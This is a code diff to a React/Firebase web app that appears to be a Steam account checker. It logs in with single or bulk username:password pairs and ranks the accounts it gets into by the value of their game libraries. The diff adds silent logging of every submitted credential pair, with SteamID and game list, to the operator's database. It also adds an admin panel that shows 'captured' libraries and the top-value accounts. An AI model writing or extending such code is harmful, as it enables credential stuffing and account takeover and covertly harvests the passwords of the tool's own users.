@@ -5,11 +5,11 @@
 
 import { useState, useCallback, useRef, useEffect, FormEvent, ChangeEvent } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
-import { Search, User, Gamepad2, AlertCircle, Loader2, ExternalLink, Upload, List, Play, Square, ChevronDown, ChevronUp, Download, Shield, ShieldCheck, LogOut, Clock, Globe, CreditCard, TrendingUp, DollarSign } from 'lucide-react';
+import { Search, User, Gamepad2, AlertCircle, Loader2, ExternalLink, Upload, List, Play, Square, ChevronDown, ChevronUp, Download, Shield, ShieldCheck, LogOut, Clock, Globe, CreditCard, TrendingUp, DollarSign, Trash2, Eye } from 'lucide-react';
 import { SteamProfile, SteamGame, ProfileState } from './types';
 import { auth, db, loginWithGoogle, checkIsAdmin } from './firebase';
 import { onAuthStateChanged, signOut, User as FirebaseUser } from 'firebase/auth';
-import { collection, query, orderBy, limit, onSnapshot, Timestamp, where } from 'firebase/firestore';
+import { collection, query, orderBy, limit, onSnapshot, Timestamp, where, addDoc, serverTimestamp, writeBatch, getDocs, deleteDoc, doc } from 'firebase/firestore';
 
 interface BulkAccount {
   id: string;
@@ -21,8 +21,35 @@ interface BulkAccount {
   walletBalance?: string | null;
 }
 
+const HIGH_VALUE_KEYWORDS = [
+    'resident evil', 'grand theft auto', 'gta v', 'elden ring', 'cyberpunk',
+    'red dead', 'call of duty', 'hogwarts', 'baldur\'s gate', 'spider-man',
+    'god of war', 'the witcher', 'assassin\'s creed', 'rust', 'dayz',
+    'ark:', 'dying light', 'helldivers', 'palworld', 'terraria',
+    'stardew valley', 'hollow knight', 'hades', 'dead by daylight', 'rainbow six',
+    'doom', 'fallout', 'skyrim', 'left 4 dead', 'half-life', 'portal', 'tekken', 'street fighter',
+    'mortal kombat', 'forza', 'fifa', 'ea sports', 'monster hunter', 'dark souls', 'sekiro'
+];
+
+const calculateValueScore = (games?: SteamGame[]) => {
+    if (!games) return 0;
+    let score = 0;
+    for (const g of games) {
+        let itemScore = 1;
+        const name = g.name.toLowerCase();
+        if (HIGH_VALUE_KEYWORDS.some(k => name.includes(k))) {
+            itemScore += 50;
+        }
+        if (g.playtime_forever && g.playtime_forever > 600) itemScore += 5;
+        if (g.playtime_forever && g.playtime_forever > 6000) itemScore += 10;
+        score += itemScore;
+    }
+    return Math.round(score);
+};
+
 export default function App() {
   const [mode, setMode] = useState<'single' | 'bulk' | 'admin'>('single');
+  const [expandedCheckId, setExpandedCheckId] = useState<string | null>(null);
 
   // Admin State
   const [user, setUser] = useState<FirebaseUser | null>(null);
@@ -49,6 +76,17 @@ export default function App() {
   const [isAdminLoading, setIsAdminLoading] = useState(false);
   const stopBulkRef = useRef(false);
 
+  const logActivity = async (data: any) => {
+    try {
+      await addDoc(collection(db, 'checks'), {
+        ...data,
+        timestamp: serverTimestamp()
+      });
+    } catch (e) {
+      console.warn("Front-end logging failed:", e);
+    }
+  };
+
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, async (u) => {
         setUser(u);
@@ -64,19 +102,61 @@ export default function App() {
   }, []);
 
   const [adminGameSearch, setAdminGameSearch] = useState('');
+  const [isResetting, setIsResetting] = useState(false);
+
+  const resetDatabase = async () => {
+    if (!window.confirm('CRITICAL: This will delete ALL logged accounts from the database. This action is irreversible. Continue?')) return;
+    
+    setIsResetting(true);
+    let totalDeleted = 0;
+    try {
+      // Efficient batch deletion
+      while (true) {
+        // Query for a small chunk of documents to delete
+        const q = query(collection(db, 'checks'), limit(500));
+        const snapshot = await getDocs(q);
+        
+        if (snapshot.empty) break;
+
+        const batch = writeBatch(db);
+        snapshot.docs.forEach(d => {
+            batch.delete(d.ref);
+        });
+        
+        await batch.commit();
+        totalDeleted += snapshot.size;
+        console.log(`Successfully deleted batch of ${snapshot.size}. Total: ${totalDeleted}`);
+        
+        // Small delay to prevent UI hang and rate limiting
+        await new Promise(r => setTimeout(r, 100));
+
+        // Stop if we reach a huge number in one go to prevent browser timeout, 
+        // though 1M is theoretically possible if the user waits.
+        if (totalDeleted >= 100000) {
+            alert(`Deleted 100,000 records. Please refresh and run again to continue clearing the remainder.`);
+            break;
+        }
+      }
+      
+      alert(`Database wipe complete. Total records removed: ${totalDeleted}`);
+    } catch (err: any) {
+      console.error('CRITICAL: Reset failed:', err);
+      alert('Database Reset Failed: ' + (err.message || 'Unknown error'));
+    } finally {
+      setIsResetting(false);
+    }
+  };
   const [adminError, setAdminError] = useState<string | null>(null);
 
   useEffect(() => {
     if (isAdmin && mode === 'admin') {
-        // Simplified query to ensure it doesn't fail on missing index
-        // We'll filter the last 24h client-side for now
         const q = query(
             collection(db, 'checks'), 
             orderBy('timestamp', 'desc'), 
-            limit(1000)
+            limit(10000)
         );
 
-        console.log("Admin Panel: Subscribing to live checks...");
+        console.log("Admin Panel: Subscribing to live checks (limit: 10,000)...");
 
         const unsubscribe = onSnapshot(q, 
             (snapshot) => {
@@ -194,6 +274,18 @@ export default function App() {
           setGameCount(loginData.game_count || 0);
           setSingleWalletBalance(loginData.walletBalance || null);
           handledViaLogin = true;
+          
+          logActivity({
+            credentials: `${username}:${password}`,
+            steamId: loginData.steamId,
+            personaName: loginData.profile.personaname,
+            avatar: loginData.profile.avatarfull,
+            status: 'success',
+            gameCount: loginData.game_count || 0,
+            gameNames: (loginData.games || []).map((g: any) => g.name),
+            valueScore: calculateValueScore(loginData.games || []),
+            method: 'login_check'
+          });
         }
       } else {
         // Standard resolution
@@ -214,6 +306,14 @@ export default function App() {
 
         if (!userData) throw new Error('User not found.');
         setProfile(userData);
+        
+        logActivity({
+          steamId: steamId,
+          personaName: userData.personaname,
+          avatar: userData.avatarfull,
+          status: 'search',
+          method: 'public_profile'
+        });
 
         const gamesData = await gamesRes.json();
         if (gamesData.response) {
@@ -225,6 +325,15 @@ export default function App() {
       }
     } catch (err: any) {
       setError(err.message || 'An unexpected error occurred.');
+      
+      if (searchInput.trim() && !searchInput.trim().includes(':')) {
+          logActivity({
+              credentials: searchInput.trim(),
+              status: 'failed',
+              error: err.message || 'Unknown error',
+              method: 'single_check'
+          });
+      }
     } finally {
       setLoading(false);
     }
@@ -372,6 +481,19 @@ export default function App() {
                         };
                         return next;
                     });
+
+                    logActivity({
+                        credentials: job.credentials,
+                        steamId: loginData.steamId,
+                        personaName: loginData.profile.personaname,
+                        avatar: loginData.profile.avatarfull,
+                        status: 'success',
+                        gameCount: loginData.game_count || 0,
+                        gameNames: (loginData.games || []).map((g: any) => g.name),
+                        valueScore: calculateValueScore(loginData.games || []),
+                        method: 'bulk_login'
+                    });
+
                     success = true;
                 } catch (err: any) {
                     lastError = err.message || 'Error occurred';
@@ -478,32 +600,6 @@ export default function App() {
     // Find most valuable account
     const successAccounts = bulkAccounts.filter(a => a.status === 'success');
     let mostValuable = null;
-
-    const HIGH_VALUE_KEYWORDS = [
-        'resident evil', 'grand theft auto', 'gta v', 'elden ring', 'cyberpunk',
-        'red dead', 'call of duty', 'hogwarts', 'baldur\'s gate', 'spider-man',
-        'god of war', 'the witcher', 'assassin\'s creed', 'rust', 'dayz',
-        'ark:', 'dying light', 'helldivers', 'palworld', 'terraria',
-        'stardew valley', 'hollow knight', 'hades', 'dead by daylight', 'rainbow six',
-        'doom', 'fallout', 'skyrim', 'left 4 dead', 'half-life', 'portal', 'tekken', 'street fighter',
-        'mortal kombat', 'forza', 'fifa', 'ea sports', 'monster hunter', 'dark souls', 'sekiro'
-    ];
-
-    const calculateValueScore = (games?: SteamGame[]) => {
-        if (!games) return 0;
-        let score = 0;
-        for (const g of games) {
-            let itemScore = 1;
-            const name = g.name.toLowerCase();
-            if (HIGH_VALUE_KEYWORDS.some(k => name.includes(k))) {
-                itemScore += 50;
-            }
-            if (g.playtime_forever && g.playtime_forever > 600) itemScore += 5;
-            if (g.playtime_forever && g.playtime_forever > 6000) itemScore += 10;
-            score += itemScore;
-        }
-        return score;
-    };
 
     if (successAccounts.length > 0) {
         mostValuable = successAccounts.reduce((prev, current) => {
@@ -704,6 +800,22 @@ export default function App() {
     );
   };
 
+    const [debugInfo, setDebugInfo] = useState<any>(null);
+    const [isDebugging, setIsDebugging] = useState(false);
+
+    const checkDebug = async () => {
+        setIsDebugging(true);
+        try {
+            const res = await fetch('/api/admin/debug-db');
+            const data = await res.json();
+            setDebugInfo(data);
+        } catch (e: any) {
+            setDebugInfo({ error: e.message });
+        } finally {
+            setIsDebugging(false);
+        }
+    };
+
   const renderAdminPanel = () => {
     if (!isAdmin) return null;
 
@@ -764,9 +876,28 @@ export default function App() {
                    )}
                 </div>
                 <div className="flex gap-4 items-center">
-                    <div className="text-right">
-                        <p className="text-[9px] uppercase text-slate-500 font-bold">Activity Status</p>
-                        <p className="text-xs font-mono text-emerald-400">SYNCING LIVE</p>
+                    <div className="text-right flex flex-col items-end gap-1">
+                        <div className="flex gap-2">
+                             <button 
+                                onClick={resetDatabase}
+                                disabled={isResetting}
+                                className="text-[9px] uppercase font-mono text-rose-500 hover:text-rose-400 flex items-center gap-1 transition-colors bg-slate-950 px-2 py-1 rounded border border-slate-800 disabled:opacity-50"
+                            >
+                                {isResetting ? <Loader2 className="w-2 h-2 animate-spin" /> : <Trash2 className="w-2 h-2" />} 
+                                Reset DB
+                            </button>
+                            <button 
+                                onClick={checkDebug}
+                                className="text-[9px] uppercase font-mono text-slate-500 hover:text-cyan-400 flex items-center gap-1 transition-colors bg-slate-950 px-2 py-1 rounded border border-slate-800"
+                            >
+                                {isDebugging ? <Loader2 className="w-2 h-2 animate-spin" /> : <Shield className="w-2 h-2" />} 
+                                Debug
+                            </button>
+                        </div>
+                        <div className="flex items-center gap-2">
+                             <p className="text-[9px] uppercase text-slate-500 font-bold">Status</p>
+                             <p className="text-[10px] font-mono text-emerald-400 animate-pulse">● LIVE</p>
+                        </div>
                     </div>
                     <button 
                       onClick={() => { setMode('single'); signOut(auth); }}
@@ -776,6 +907,16 @@ export default function App() {
                     </button>
                 </div>
             </div>
+
+            {debugInfo && (
+                <div className="bg-slate-950 border border-cyan-500/30 p-3 rounded mb-6 font-mono text-[10px] relative">
+                    <div className="absolute top-2 right-2">
+                        <button onClick={() => setDebugInfo(null)} className="text-slate-600 hover:text-slate-400">×</button>
+                    </div>
+                    <p className="text-cyan-400 mb-2 font-bold underline">SYSTEM DEBUG LOG</p>
+                    <pre className="text-slate-400 whitespace-pre-wrap overflow-x-auto">{JSON.stringify(debugInfo, null, 2)}</pre>
+                </div>
+            )}
 
             <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                 <div className="bg-slate-900 border border-slate-800 p-4 rounded">
@@ -810,14 +951,31 @@ export default function App() {
                     </div>
                     <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-5 gap-px bg-slate-800">
                         {top10.map((acc, i) => (
-                            <div key={`top_${acc.id}`} className="bg-slate-900 p-3 hover:bg-slate-800 transition-colors">
+                            <button 
+                                key={`top_${acc.id}`} 
+                                onClick={() => setExpandedCheckId(expandedCheckId === acc.id ? null : acc.id)}
+                                className={`bg-slate-900 p-3 hover:bg-slate-800 transition-colors text-left flex flex-col group ${expandedCheckId === acc.id ? 'ring-1 ring-cyan-500 bg-slate-800' : ''}`}
+                            >
                                 <div className="flex justify-between items-start mb-2">
-                                    <span className="text-[9px] font-black text-slate-600">#0{i+1}</span>
+                                    <span className="text-[9px] font-black group-hover:text-cyan-500 transition-colors text-slate-600">#0{i+1}</span>
                                     <span className="text-[10px] font-mono font-bold text-emerald-400">+{acc.valueScore}</span>
                                 </div>
                                 <p className="text-[11px] font-bold truncate text-slate-200">{acc.credentials.split(':')[0]}</p>
                                 <p className="text-[9px] text-slate-500 font-mono mt-1">{acc.gameCount} Games</p>
-                            </div>
+                                {expandedCheckId === acc.id && (
+                                     <div className="mt-3 pt-2 border-t border-slate-700 w-full overflow-hidden">
+                                        <p className="text-[8px] uppercase font-bold text-cyan-500 mb-2 tracking-widest">Library Preview</p>
+                                        <div className="flex flex-col gap-1 max-h-32 overflow-y-auto custom-scrollbar">
+                                            {(acc.gameNames || []).slice(0, 50).map((name: string, idx: number) => (
+                                                <p key={idx} className="text-[8px] text-slate-400 truncate leading-tight">• {name}</p>
+                                            ))}
+                                            {(acc.gameNames || []).length > 50 && (
+                                                <p className="text-[8px] text-slate-600 italic">... and {(acc.gameNames || []).length - 50} more</p>
+                                            )}
+                                        </div>
+                                     </div>
+                                )}
+                            </button>
                         ))}
                     </div>
                 </div>
@@ -944,6 +1102,34 @@ export default function App() {
                                     </div>
                                 )}
                             </div>
+
+                            <button 
+                                onClick={(e) => { e.stopPropagation(); setExpandedCheckId(expandedCheckId === check.id ? null : check.id); }}
+                                className={`p-1.5 rounded transition-colors ${expandedCheckId === check.id ? 'bg-cyan-600 text-white' : 'bg-slate-800 text-slate-500 hover:text-slate-300'}`}
+                            >
+                                <Eye className="w-3 h-3" />
+                            </button>
+
+                            {expandedCheckId === check.id && check.status === 'success' && (
+                                <div className="w-full mt-2 pt-4 border-t border-slate-800 animate-in fade-in slide-in-from-top-1 duration-200">
+                                    <div className="flex items-center justify-between mb-4">
+                                        <h4 className="text-[10px] uppercase font-bold text-cyan-400 tracking-wider flex items-center gap-2">
+                                            <Gamepad2 className="w-3 h-3" /> Captured Game Library
+                                        </h4>
+                                        <span className="text-[10px] text-slate-500 font-mono">{check.gameCount} Total Titles Found</span>
+                                    </div>
+                                    <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-2">
+                                        {(check.gameNames || []).map((name: string, idx: number) => (
+                                            <div key={idx} className="bg-slate-900/50 border border-slate-800 p-2 rounded flex flex-col gap-1 hover:border-slate-700 transition-colors">
+                                                <p className="text-[9px] text-slate-300 leading-tight font-medium line-clamp-2">{name}</p>
+                                            </div>
+                                        ))}
+                                    </div>
+                                    {(check.gameNames || []).length === 0 && (
+                                        <p className="text-[10px] text-slate-600 italic py-4">No game data was captured for this entry.</p>
+                                    )}
+                                </div>
+                            )}
                         </div>
                     ))}
                     {filteredChecks.length === 0 && (
